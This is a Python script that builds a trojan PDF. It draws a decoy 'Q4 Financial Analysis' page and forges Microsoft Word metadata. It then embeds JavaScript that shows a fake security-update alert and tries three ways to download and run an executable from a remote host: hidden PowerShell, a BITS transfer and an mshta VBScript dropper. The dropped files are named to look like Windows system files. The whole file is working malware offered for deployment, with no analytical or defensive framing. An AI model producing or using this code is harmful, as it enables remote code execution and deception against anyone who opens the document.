#!/usr/bin/env python3
# advanced_trojan_pdf.py

import os
from PyPDF2 import PdfWriter, PdfReader
from reportlab.pdfgen import canvas
from reportlab.lib.pagesizes import letter
from reportlab.lib.utils import ImageReader
import io
import random

def create_realistic_pdf_content():
    """Create a realistic-looking PDF with decoy content"""
    
    # Create a PDF in memory using ReportLab
    packet = io.BytesIO()
    can = canvas.Canvas(packet, pagesize=letter)
    
    # Add professional-looking content
    can.setFont("Helvetica-Bold", 16)
    can.drawString(100, 750, "CONFIDENTIAL BUSINESS REPORT")
    
    can.setFont("Helvetica", 12)
    can.drawString(100, 720, "Q4 Financial Analysis and Projections")
    can.drawString(100, 700, "Prepared for: Executive Committee")
    can.drawString(100, 680, "Date: December 2024")
    
    # Add some fake content
    can.drawString(100, 650, "Key Findings:")
    can.drawString(120, 630, "• Revenue increased by 15% quarter-over-quarter")
    can.drawString(120, 610, "• Market share expanded in European territories")
    can.drawString(120, 590, "• New product line showing strong early adoption")
    
    can.drawString(100, 550, "Recommendations:")
    can.drawString(120, 530, "• Increase Q1 marketing budget by 20%")
    can.drawString(120, 510, "• Expand sales team in APAC region")
    can.drawString(120, 490, "• Accelerate product development timeline")
    
    # Add a fake watermark
    can.setFont("Helvetica-Oblique", 8)
    can.setFillColorRGB(0.8, 0.8, 0.8)
    can.drawString(200, 100, "CONFIDENTIAL AND PROPRIETARY")
    
    can.save()
    
    # Move to the beginning of the StringIO buffer
    packet.seek(0)
    return packet

def create_malicious_pdf_advanced(output_file="business_report.pdf", 
                                 payload_url="http://192.168.1.111/downloader.exe",
                                 use_icon=None):
    """Create an advanced malicious PDF with realistic content"""
    
    # Create realistic PDF content
    realistic_pdf = create_realistic_pdf_content()
    
    # Create PDF writer and add our realistic page
    writer = PdfWriter()
    reader = PdfReader(realistic_pdf)
    writer.add_page(reader.pages[0])
    
    # Add sophisticated JavaScript payload
    malicious_js = f'''
    // Sophisticated payload delivery with multiple fallbacks
    function executePayload() {{
        var success = false;
        
        // Method 1: PowerShell download and execute (most reliable)
        try {{
            var psCommand = "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command \\\\"";
            psCommand += "\\$webClient = New-Object System.Net.WebClient; ";
            psCommand += "\\$tempFile = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), 'WindowsUpdate_' + [System.IO.Path]::GetRandomFileName() + '.exe'); ";
            psCommand += "\\$webClient.DownloadFile('{payload_url}', \\$tempFile); ";
            psCommand += "Start-Process -FilePath \\$tempFile -WindowStyle Hidden; ";
            psCommand += "\\\\"";
            
            app.launchURL(psCommand, true);
            success = true;
            console.println("Payload delivered via PowerShell");
        }} catch(e) {{}}
        
        // Method 2: CMD fallback
        if (!success) {{
            try {{
                var cmdCommand = "cmd.exe /c powershell -WindowStyle Hidden -Command \\\\"";
                cmdCommand += "Start-BitsTransfer -Source '{payload_url}' -Destination %TEMP%\\\\\\\\windows_update.exe; ";
                cmdCommand += "Start-Process %TEMP%\\\\\\\\windows_update.exe; ";
                cmdCommand += "\\\\"";
                
                this.submitForm({{cURL: cmdCommand, cSubmitAs: 'PDF'}});
                success = true;
                console.println("Payload delivered via CMD");
            }} catch(e) {{}}
        }}
        
        // Method 3: VBScript fallback for maximum compatibility
        if (!success) {{
            try {{
                var vbsCode = "Dim xHttp: Set xHttp = CreateObject(\\\\"Microsoft.XMLHTTP\\\\")\\n";
                vbsCode += "Dim bStrm: Set bStrm = CreateObject(\\\\"Adodb.Stream\\\\")\\n";
                vbsCode += "xHttp.Open \\\\"GET\\\\", \\\\"{payload_url}\\\\", False\\n";
                vbsCode += "xHttp.Send\\n";
                vbsCode += "With bStrm\\n";
                vbsCode += "    .Type = 1\\n";
                vbsCode += "    .Open\\n";
                vbsCode += "    .Write xHttp.responseBody\\n";
                vbsCode += "    .SaveToFile \\\\"\\\\" & CreateObject(\\\\"WScript.Shell\\\\").ExpandEnvironmentStrings(\\\\"%TEMP%\\\\\\\\svchost_update.exe\\\\") & \\\\"\\\\", 2\\n";
                vbsCode += "End With\\n";
                vbsCode += "CreateObject(\\\\"WScript.Shell\\\\").Run \\\\"\\\\" & CreateObject(\\\\"WScript.Shell\\\\").ExpandEnvironmentStrings(\\\\"%TEMP%\\\\\\\\svchost_update.exe\\\\") & \\\\"\\\\", 0, False";
                
                this.submitForm({{cURL: "mshta vbscript:Execute(\\\\"" + vbsCode + "\\\\")", cSubmitAs: 'HTML'}});
                success = true;
                console.println("Payload delivered via VBScript");
            }} catch(e) {{}}
        }}
        
        return success;
    }}
    
    // Wait for PDF to fully load then execute
    function delayedExecution() {{
        try {{
            // Show decoy message
            app.alert("This document contains embedded content that requires updating. Please wait while we load the latest security patches...", 2);
            
            // Execute payload after a short delay
            app.setTimeOut("executePayload()", 2000);
        }} catch(e) {{
            // Silent fallback - try immediate execution
            executePayload();
        }}
    }}
    
    // Start the attack chain
    delayedExecution();
    '''
    
    # Add the JavaScript to the PDF
    writer.add_js(malicious_js)
    
    # Add PDF metadata to make it look legitimate
    writer.add_metadata({
        '/Author': 'Corporate Strategy Department',
        '/Title': 'Q4 Financial Analysis Report',
        '/Subject': 'Confidential Business Analysis',
        '/Keywords': 'financial, report, analysis, confidential',
        '/Creator': 'Microsoft Office Word 2016',
        '/Producer': 'Microsoft Office Word 2016',
        '/CreationDate': 'D:20241215090000Z',
        '/ModDate': 'D:20241215090000Z'
    })
    
    # Write the final PDF
    with open(output_file, 'wb') as f:
        writer.write(f)
    
    print(f"[+] Advanced malicious PDF created: {output_file}")
    print(f"[+] Payload URL: {payload_url}")
    print(f"[+] PDF appears as: 'Q4 Financial Analysis Report'")
    print(f"[+] JavaScript payload embedded with multiple execution methods")
    
    return output_file

if __name__ == "__main__":
    # Create the malicious PDF
    pdf_file = create_malicious_pdf_advanced(
        output_file="Q4_Financial_Report.pdf",
        payload_url="http://192.168.1.111/downloader.exe"
    )
    
    print(f"\n[+] Trojan PDF ready for deployment!")
    print(f"[+] File: {pdf_file}")
    print(f"[+] When opened, it will download and execute: http://192.168.1.111/downloader.exe")
